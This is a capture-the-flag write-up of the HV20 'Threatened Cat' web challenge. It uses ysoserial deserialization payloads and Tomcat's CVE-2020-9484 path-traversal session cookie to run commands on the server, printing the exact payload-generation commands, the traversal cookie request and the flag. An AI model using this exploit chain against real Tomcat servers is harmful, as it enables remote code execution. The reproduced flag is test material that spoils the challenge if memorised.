# Day 21 / HV20.21 Threatened Cat



## Challenge

<!-- ...10....:...20....:...30....:...40....:...50....:...60....:...70....:. -->
* Author: inik
* Tag:    #web-security #exploitation
* Level:  hard

You can feed this cat with many different things, but only a certain kind of
file can endanger the cat.

Do you find that kind of files? And if yes, can you use it to disclose the flag?
Ahhh, by the way: The cat likes to hide its stash in `/usr/bin/catnip.txt`.

Note: The cat is currently in hibernation and will take a few seconds to wake
up.


### Resources

An instance of the web app _Threatened Cat_ could be started from within the
the challenge description.



## Solution

The webapp was a nice ASCII kitty waiting for a file upload. (On the left)

If you uploaded a file, the cat would print out what kind of file it is and
whether it feels threatened about it. For example if a JPG image was uploaded
the result would be: (On the right)

![](threatcat_webapp.png) ![](threatcat_jpg.png)

The file information the cat printed seemed to come from the canonical 
[file(1)]() command. The only way that some unusual reaction could be provoked
was if a rather big file was uploaded. This would lead to an error message
indicating the server runtime:

[file(1)]: https://en.wikipedia.org/wiki/File_(command)

`[E]: An error occured: Maximum upload size exceeded; nested exception is 
java.lang.IllegalStateException: 
org.apache.tomcat.util.http.fileupload.impl.SizeLimitExceededException: 
the request was rejected because its size (98566380) exceeds the configured 
maximum (131072)`

Server runtime: Java/Tomcat (which is fitting the overall cat theming)


### Why so serial ?

While searching the web for exploits against Java/Tomcat, sooner or later the
topic _object serialization_ came up. Since serialization attacks are quite
intricate to build yourself, it's probably best to look for a software package
that generates such attack payloads. \*_[ysoserial project]() entering the
stage_\*

[ysoserial project]: https://github.com/frohoff/ysoserial

Since experience with serializaton attacks was lacking the preferred approach
was to simply try every payload type the tool has to offer while keeping the 
injected command simple.

With the first choice named `CommonsCollections1`, the cat felt already
threatened. With the choice `CommonsCollections2` it said that it felt _really_
threatened.

```sh
$ java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections1 'sleep 5' > attack1
$ java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'sleep 5' > attack2
```

![](threatcat_threatened.png) ![](threatcat_really_threatened.png)

So far so good. But what ever command was included into the payload, it didn't
seem to get triggered.


### "Got my finger on the trigger... I'm gonna pull it."

Turns out that there is a [vulnerability in Apache Tomcat (CVE-2020-9484)] that
allows to trigger a deserialization attack by sending the server a modified
JSESSION cookie. The server basically tries to find a session stored as a file
where the attacker can provide the path to the cookie file. If the server finds
a file that ends in `.session` in the given path, it will run the 
deserialization inside it.

[vulnerability in Apache Tomcat (CVE-2020-9484)]: https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/

In the end the whole attack went like this:

1. _ysoserial_ was used to craft a special deserialization payload, whose sole
   purpose is to copy the flag `/usr/bin/catnip.txt` to a path that is readable
   from the web facing side – i.e. `/usr/local/uploads/catnip.txt` readable at
   `cat/files/catnip.txt` from the web.

   ```sh
   $ java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'cp /usr/bin/catnip.txt /usr/local/uploads/catnip.txt' > cattack.session
   ```

2. Upload the payload to the server via its cat web app.

3. Triggering the payload via the session cookie vulnerability.

   ```sh
   $ curl 'https://eca4b853-2bb9-4a16-a11d-e532a29541a4.idockerand/cat/' -H 'Cookie: JSESSIONID=../../../../../usr/local/uploads/cattack'
   <!doctype html><html lang="en"><head><title>HTTP Status 500 – Internal Server Error</title>
   [ LOTS OF JAVA ERROR MESSAGES ]
   ```

4. Casually download the [catnip.txt](catnip.txt) from the web page.


<!-- ...10....:...20....:...30....:...40....:...50....:...60....:...70....:. -->
--------------------------------------------------------------------------------

Flag: `HV20{!D3s3ri4liz4t10n_rulz!}`

